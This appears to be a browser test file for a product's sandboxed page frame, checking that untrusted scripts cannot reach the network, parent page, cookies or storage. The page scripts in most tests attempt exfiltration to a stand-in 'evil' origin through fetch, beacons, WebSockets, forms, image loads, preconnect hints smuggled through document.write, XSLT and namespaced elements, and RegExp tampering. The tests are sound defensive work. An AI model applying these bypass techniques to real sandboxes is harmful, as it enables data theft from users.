import { expect, onTestFinished, test } from 'bun:test';
import {
  makeDeviceToolCaller,
  seedDevicePackage,
  seedScreenOnDevice,
} from '@heynixie/devices/test-utils';
import { waitForCondition } from '@heynixie/testing';
import { z } from 'zod';
import { startPageFrameFront } from '../test-utils/start-page-frame-front';
import { startTestAPI } from '../test-utils/start-test-api';

// The page runs in a real Chrome, in the frame that the API serves, under the policy it sends.
async function setupTest(options: { hasTrustedTypes?: boolean } = {}) {
  const api = await startTestAPI();

  // Sits between the front and the API, and puts a script ahead of the bridge in each frame, so a
  // page can read the window it would start with if no bridge ran.
  const answerStart = async (request: Request): Promise<Response> => {
    const url = new URL(request.url);

    const answer = await globalThis.fetch(`${api.url}${url.pathname}${url.search}`, {
      method: request.method,
      headers: {
        'x-forwarded-proto': request.headers.get('x-forwarded-proto') ?? '',
        'x-forwarded-host': request.headers.get('x-forwarded-host') ?? '',
      },
    });

    if (!url.pathname.includes('/frames/')) {
      return answer;
    }

    const headers = new Headers(answer.headers);

    headers.delete('content-length');

    const document = await answer.text();

    const probe = '<script>window.startingXSLT = typeof XSLTProcessor;</script>';

    return new Response(document.replace('<script>', `${probe}<script>`), {
      status: answer.status,
      headers,
    });
  };

  const start = Bun.serve({ fetch: answerStart, hostname: '127.0.0.1', port: 0 });

  onTestFinished(async () => {
    await start.stop(true);
  });

  const holder = { frame: '' };

  const front = startPageFrameFront({
    apiURL: `http://127.0.0.1:${String(start.port)}`,
    readFrame: () => holder.frame,
    hasTrustedTypes: options.hasTrustedTypes ?? true,
  });

  const clock = api.context.clock;
  const streams = api.context.clients.devices;

  const device = await seedScreenOnDevice({ log: api.context.log, clock });

  streams.open(device.deviceID, { width: 1280, height: 720, pixelRatio: 1 });

  const call = makeDeviceToolCaller({
    log: api.context.log,
    definitions: api.context.definitions,
    clock,
    streams,
  });

  await call('device.layout', {
    device: device.deviceID,
    columns: ['1fr'],
    rows: ['1fr'],
    regions: [{ name: 'pond', column: 1, row: 1 }],
  });

  const view = new Bun.WebView({ backend: 'chrome' });

  onTestFinished(() => {
    view.close();
  });

  const readPosts = async () => {
    const read = await view.evaluate('JSON.stringify(window.events)');

    const postsSchema = z.array(
      z.object({
        name: z.string().optional(),
        data: z.json().optional(),
        type: z.string().optional(),
        message: z.string().optional(),
      }),
    );

    return postsSchema.parse(JSON.parse(String(read)));
  };

  return {
    front,
    readPosts,

    // an approved package, which a page loads once it names it
    approvePackage: (spec: string, files: Record<string, string>) =>
      seedDevicePackage(
        {
          log: api.context.log,
          definitions: api.context.definitions,
          clock,
          streams,
        },
        spec,
        files,
      ),

    // fills the region with a page and opens the host page that frames it
    openPage: async (html: string, packages: readonly string[] = []) => {
      await call('device.region', {
        device: device.deviceID,
        region: 'pond',
        content: { kind: 'html', html, ...(packages.length === 0 ? {} : { packages }) },
      });

      const listed = await call('devices.list', {});

      const found = /"shown":"(?<shown>[^"]+)"/u.exec(JSON.stringify(listed));

      holder.frame = streams.tickets.issue(
        device.deviceID,
        'pond',
        found?.groups?.['shown'] ?? '',
        [],
      ).frame;

      await view.navigate('about:blank');
      await view.navigate(front.hostURL);
    },

    // opens the frame's own address as a page, as a person who copies it from the device page would
    openFrameOnItsOwn: async () => {
      await view.navigate(`${new URL(front.hostURL).origin}/rpc/device/frames/${holder.frame}`);
    },
    readTitle: async () => {
      const title = await view.evaluate('document.title');

      return String(title);
    },
    waitForPost: (name: string) =>
      waitForCondition(
        async () => {
          const posts = await readPosts();

          return posts.some((post) => post.name === name);
        },
        { intervalMs: 50, timeoutMs: 6000 },
      ),
    post: (data: unknown) => view.evaluate(`window.post(${JSON.stringify(data)})`),
    spoof: () => view.evaluate('window.spoof()'),
    waitForFrameLoads: (count: number) =>
      waitForCondition(
        async () => {
          const loads = await view.evaluate('window.loads');

          return Number(loads) >= count;
        },
        { intervalMs: 50, timeoutMs: 6000 },
      ),
  };
}

test('it keeps a page from reaching the network or the device page around it', async () => {
  const ctx = await setupTest();

  await ctx.openPage(`<script>
    const evil = ${JSON.stringify(ctx.front.evilOrigin)};
    const results = {};

    async function attempt(name, run) {
      try {
        await run();
        results[name] = 'allowed';
      } catch (error) {
        results[name] = error.name;
      }
    }

    (async () => {
      await attempt('fetch', () => fetch(evil + '/fetch'));
      navigator.sendBeacon(evil + '/beacon', 'x');
      await attempt('websocket', () => new Promise((resolve, reject) => {
        const socket = new WebSocket(evil.replace('http', 'ws') + '/ws');
        socket.onopen = () => resolve();
        socket.onerror = () => reject(new Error('refused'));
      }));
      await attempt('parentDocument', () => parent.document.title);
      await attempt('parentStorage', () => parent.localStorage.length);
      await attempt('ownCookie', () => document.cookie);
      await attempt('ownStorage', () => localStorage.length);
      await attempt('topNavigation', () => {
        top.location.href = evil + '/top';
      });
      await attempt('deviceAPI', () => fetch('/rpc/devices/resize', { method: 'POST' }));

      nixie.onMessage(() => {
        new Image().src = evil + '/image';

        const form = document.createElement('form');
        form.action = evil + '/form';
        form.method = 'post';
        document.body.append(form);
        form.submit();

        location.href = evil + '/navigate';
      });

      nixie.send('probed', results);
    })();
  </script>`);

  await ctx.waitForPost('probed');
  await ctx.waitForFrameLoads(1);
  await ctx.post({ nixie: true, type: 'message', data: 'leave' });
  await ctx.waitForFrameLoads(2);

  const posts = await ctx.readPosts();

  await fetch(`${ctx.front.evilOrigin}/control`);

  expect([
    posts.find((post) => post.name === 'probed')?.data,
    ctx.front.evilRequests,
  ]).toStrictEqual([
    {
      fetch: 'TypeError',
      websocket: 'Error',
      parentDocument: 'SecurityError',
      parentStorage: 'SecurityError',
      ownCookie: 'SecurityError',
      ownStorage: 'SecurityError',
      topNavigation: 'SecurityError',
      deviceAPI: 'TypeError',
    },
    ['/control'],
  ]);
});

test('it keeps a page from opening a connection by a resource hint, a string of markup or WebRTC', async () => {
  const ctx = await setupTest();

  const evil = ctx.front.evilOrigin;

  await ctx.openPage(`<script>
    for (const rel of ['preconnect', 'prefetch', 'prerender', 'dns-prefetch']) {
      const hint = document.createElement('link');
      hint.rel = rel;
      hint.href = ${JSON.stringify(evil)} + '/' + rel;
      document.head.append(hint);
    }

    const holder = document.createElement('div');
    holder.innerHTML = '<' + 'link rel="preconnect" href="${evil}/inner">';
    document.body.append(holder);

    const parsed = new DOMParser().parseFromString('<' + 'link rel="preconnect" href="${evil}/parsed">', 'text/html');
    document.body.append(document.importNode(parsed.head.firstChild ?? document.body, true));

    nixie.send('probed', { peer: typeof RTCPeerConnection, prefixed: typeof webkitRTCPeerConnection });
    setTimeout(() => nixie.send('settled'), 1500);
  </script>`);

  await ctx.waitForPost('settled');

  const posts = await ctx.readPosts();

  expect([
    posts.find((post) => post.name === 'probed')?.data,
    ctx.front.evilConnections.count,
    ctx.front.evilRequests,
  ]).toStrictEqual([{ peer: 'undefined', prefixed: 'undefined' }, 0, []]);
});

test('it keeps a page from opening a connection by markup in a browser without trusted types', async () => {
  const ctx = await setupTest({ hasTrustedTypes: false });

  const evil = ctx.front.evilOrigin;

  await ctx.openPage(`<script>
    const link = '<' + 'link rel="preconnect" href="${evil}/';
    const holder = document.createElement('div');
    document.body.append(holder);

    holder.innerHTML = link + 'inner">';
    holder.insertAdjacentHTML('beforeend', link + 'adjacent">');
    holder.append(document.createRange().createContextualFragment(link + 'fragment">'));

    const parsed = new DOMParser().parseFromString(link + 'parsed">', 'text/html');
    holder.append(document.importNode(parsed.head.firstChild ?? holder, true));

    const frame = document.createElement('iframe');
    document.body.append(frame);

    nixie.send('probed', { trustedTypes: typeof trustedTypes, frame: frame.tagName, links: document.querySelectorAll('link').length });
    setTimeout(() => nixie.send('settled'), 1500);
  </script>`);

  await ctx.waitForPost('settled');

  const posts = await ctx.readPosts();

  expect([
    posts.find((post) => post.name === 'probed')?.data,
    ctx.front.evilConnections.count,
    ctx.front.evilRequests,
  ]).toStrictEqual([{ trustedTypes: 'undefined', frame: 'SPAN', links: 0 }, 0, []]);
});

test.each([
  {
    route: 'document.write arguments',
    outcome: 'TypeError: a page cannot write into its document',
    write: 'native',
    hasTrustedTypes: true,
  },
  {
    route: 'document.write calls',
    outcome: 'TypeError: a page cannot write into its document',
    write: 'native',
    hasTrustedTypes: true,
  },
  {
    route: 'document.writeln arguments',
    outcome: 'TypeError: a page cannot write into its document',
    write: 'native',
    hasTrustedTypes: true,
  },
  {
    route: 'a prefixed element name',
    outcome: 'span',
    write: 'native',
    hasTrustedTypes: true,
  },
  {
    route: 'prefixed XML markup',
    outcome: 'span',
    write: 'native',
    hasTrustedTypes: true,
  },
  {
    route: 'a new document',
    outcome: 'span',
    write: 'native',
    hasTrustedTypes: true,
  },
  {
    route: 'an XSLT transform',
    outcome: expect.toBeOneOf([
      'ReferenceError: XSLTProcessor is not defined',
      'no XSLTProcessor before the bridge ran',
    ]),
    write: 'native',
    hasTrustedTypes: true,
  },
  {
    route: 'markup after replaced RegExp methods',
    outcome: 'span',
    write: 'native',
    hasTrustedTypes: true,
  },
  {
    route: 'document.write arguments',
    outcome: 'TypeError: a page cannot write into its document',
    write: 'replaced',
    hasTrustedTypes: false,
  },
  {
    route: 'document.write calls',
    outcome: 'TypeError: a page cannot write into its document',
    write: 'replaced',
    hasTrustedTypes: false,
  },
  {
    route: 'document.writeln arguments',
    outcome: 'TypeError: a page cannot write into its document',
    write: 'replaced',
    hasTrustedTypes: false,
  },
  {
    route: 'a prefixed element name',
    outcome: 'span',
    write: 'replaced',
    hasTrustedTypes: false,
  },
  {
    route: 'prefixed XML markup',
    outcome: 'span',
    write: 'replaced',
    hasTrustedTypes: false,
  },
  {
    route: 'a new document',
    outcome: 'span',
    write: 'replaced',
    hasTrustedTypes: false,
  },
  {
    route: 'an XSLT transform',
    outcome: expect.toBeOneOf([
      'ReferenceError: XSLTProcessor is not defined',
      'no XSLTProcessor before the bridge ran',
    ]),
    write: 'replaced',
    hasTrustedTypes: false,
  },
  {
    route: 'markup after replaced RegExp methods',
    outcome: 'span',
    write: 'replaced',
    hasTrustedTypes: false,
  },
])(
  'it keeps a page from opening a connection by a resource hint made through $route, trusted types shown: $hasTrustedTypes',
  async (row) => {
    const ctx = await setupTest({ hasTrustedTypes: row.hasTrustedTypes });

    await ctx.openPage(`<script>
    const evil = ${JSON.stringify(ctx.front.evilOrigin)};
    const xhtml = 'http://www.w3.org/1999/xhtml';
    const hint = '<li' + 'nk rel="preconnect" href="' + evil;

    const attacks = {
      'document.write arguments': () => document.write('<li', 'nk rel="preconnect" href="' + evil + '/arguments">'),
      'document.write calls': () => {
        document.write('<li');
        document.write('nk rel="preconnect" href="' + evil + '/calls">');
      },
      'document.writeln arguments': () => document.writeln('<li', 'nk rel="preconnect" href="' + evil + '/writeln">'),
      'a prefixed element name': () => {
        const link = document.createElementNS(xhtml, 'x:link');
        link.setAttribute('rel', 'preconnect');
        link.setAttribute('href', evil + '/prefixed');
        document.head.append(link);
        return link.localName;
      },
      'prefixed XML markup': () => {
        const markup = '<x:link xmlns:x="' + xhtml + '" rel="preconnect" href="' + evil + '/xml"/>';
        const parsed = new DOMParser().parseFromString(markup, 'application/xml');
        const link = document.importNode(parsed.documentElement, true);
        document.head.append(link);
        return link.localName;
      },
      'a new document': () => {
        const link = document.implementation.createDocument(xhtml, 'link', null).documentElement;
        link.setAttribute('rel', 'preconnect');
        link.setAttribute('href', evil + '/document');
        document.head.append(document.adoptNode(link));
        return link.localName;
      },
      'an XSLT transform': () => {
        if (window.startingXSLT === 'undefined') {
          return 'no XSLTProcessor before the bridge ran';
        }
        const sheet = '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">' +
          '<xsl:template match="/"><xsl:element name="link" namespace="' + xhtml + '">' +
          '<xsl:attribute name="rel">preconnect</xsl:attribute>' +
          '<xsl:attribute name="href">' + evil + '/xslt</xsl:attribute>' +
          '</xsl:element></xsl:template></xsl:stylesheet>';
        const processor = new XSLTProcessor();
        processor.importStylesheet(new DOMParser().parseFromString(sheet, 'application/xml'));
        const source = new DOMParser().parseFromString('<a/>', 'application/xml');
        document.head.append(processor.transformToFragment(source, document));
      },
      'markup after replaced RegExp methods': () => {
        RegExp.prototype[Symbol.replace] = function (text) { return text; };
        RegExp.prototype.exec = function () { return null; };
        const holder = document.createElement('div');
        holder.innerHTML = hint + '/regexp">';
        document.body.append(holder);
        return holder.firstChild.localName;
      },
    };

    const write = Function.prototype.toString.call(document.write).includes('[native code]') ? 'native' : 'replaced';
    let outcome;
    try {
      outcome = attacks[${JSON.stringify(row.route)}]();
    } catch (error) {
      outcome = error.name + ': ' + error.message;
    }
    setTimeout(() => nixie.send('settled', { outcome, write, links: document.querySelectorAll('link').length }), 1500);
  </script>`);

    await ctx.waitForPost('settled');

    const posts = await ctx.readPosts();

    expect([
      posts.find((post) => post.name === 'settled')?.data,
      ctx.front.evilConnections.count,
      ctx.front.evilRequests,
    ]).toStrictEqual([{ outcome: row.outcome, write: row.write, links: 0 }, 0, []]);
  },
);

test('it keeps a page that opens on its own, outside the device page, from the origin of the app', async () => {
  const ctx = await setupTest();

  await ctx.openPage(`<script>
    const results = { origin: window.origin };

    for (const name of ['localStorage', 'sessionStorage']) {
      try {
        window[name].length;
        results[name] = 'allowed';
      } catch (error) {
        results[name] = error.name;
      }
    }

    try {
      results.cookie = document.cookie;
    } catch (error) {
      results.cookie = error.name;
    }

    document.title = JSON.stringify(results);
  </script>`);

  await ctx.openFrameOnItsOwn();

  const title = await ctx.readTitle();

  expect(JSON.parse(title)).toStrictEqual({
    origin: 'null',
    localStorage: 'SecurityError',
    sessionStorage: 'SecurityError',
    cookie: 'SecurityError',
  });
});

test('it hands a page the message that came before the page asked for messages', async () => {
  const ctx = await setupTest();

  await ctx.openPage(`<script>
    setTimeout(() => {
      nixie.onMessage((data) => nixie.send('echo', data));
    }, 400);
    nixie.send('loaded');
  </script>`);

  await ctx.waitForPost('loaded');
  await ctx.post({ nixie: true, type: 'message', data: { ripples: 3 } });
  await ctx.waitForPost('echo');

  const posts = await ctx.readPosts();

  expect(posts.find((post) => post.name === 'echo')?.data).toStrictEqual({ ripples: 3 });
});

test('it takes a message from the device page alone', async () => {
  const ctx = await setupTest();

  await ctx.openPage(`<script>
    nixie.onMessage((data) => nixie.send('echo', data));
    nixie.send('loaded');
  </script>`);

  await ctx.waitForPost('loaded');
  await ctx.spoof();
  await ctx.post({ nixie: true, type: 'message', data: 'real' });
  await ctx.post({ nixie: true, type: 'message', data: 'marker' });

  await waitForCondition(
    async () => {
      const posts = await ctx.readPosts();

      return posts.some((post) => post.data === 'marker');
    },
    { intervalMs: 50, timeoutMs: 6000 },
  );

  const posts = await ctx.readPosts();

  expect(posts.filter((post) => post.name === 'echo').map((post) => post.data)).toStrictEqual([
    'real',
    'marker',
  ]);
});

test('it reports an error that the page raises', async () => {
  const ctx = await setupTest();

  await ctx.openPage(
    `<script>nixie.send('loaded'); throw new TypeError('x is undefined');</script>`,
  );

  await ctx.waitForPost('loaded');

  await waitForCondition(
    async () => {
      const posts = await ctx.readPosts();

      return posts.some((post) => post.type === 'error');
    },
    { intervalMs: 50, timeoutMs: 6000 },
  );

  const posts = await ctx.readPosts();

  expect(posts.find((post) => post.type === 'error')?.message).toContain('x is undefined');
});

test('it lets a page load the package it names, and still keeps it from the network and from other packages', async () => {
  const ctx = await setupTest();

  await ctx.approvePackage('chart.js@4.4.6', {
    'dist/chart.js': 'window.chartLoaded = true;',
  });

  await ctx.approvePackage('d3@7.9.0', { 'dist/d3.js': 'window.d3Loaded = true;' });

  await ctx.openPage(
    `<script src="/rpc/device/packages/chart.js@4.4.6/dist/chart.js"></script>
    <script src="/rpc/device/packages/d3@7.9.0/dist/d3.js"></script>
    <script>
      const evil = ${JSON.stringify(ctx.front.evilOrigin)};
      const results = { chart: window.chartLoaded === true };

      async function attempt(name, run) {
        try {
          await run();
          results[name] = 'allowed';
        } catch (error) {
          results[name] = error.code || error.name;
        }
      }

      (async () => {
        results.d3 = window.d3Loaded === true;
        await attempt('fetch', () => fetch(evil + '/fetch'));
        await attempt('packageFetch', () => fetch('/rpc/device/packages/chart.js@4.4.6/dist/chart.js'));
        await attempt('undeclared', () => nixie.data('https://tides.example/today'));
        nixie.send('probed', results);
      })();
    </script>`,
    ['chart.js@4.4.6'],
  );

  await ctx.waitForPost('probed');

  const posts = await ctx.readPosts();

  await fetch(`${ctx.front.evilOrigin}/control`);

  expect([
    posts.find((post) => post.name === 'probed')?.data,
    ctx.front.evilRequests,
  ]).toStrictEqual([
    {
      chart: true,
      d3: false,
      fetch: 'TypeError',
      packageFetch: 'TypeError',
      undeclared: 'NOT_DECLARED',
    },
    ['/control'],
  ]);
});
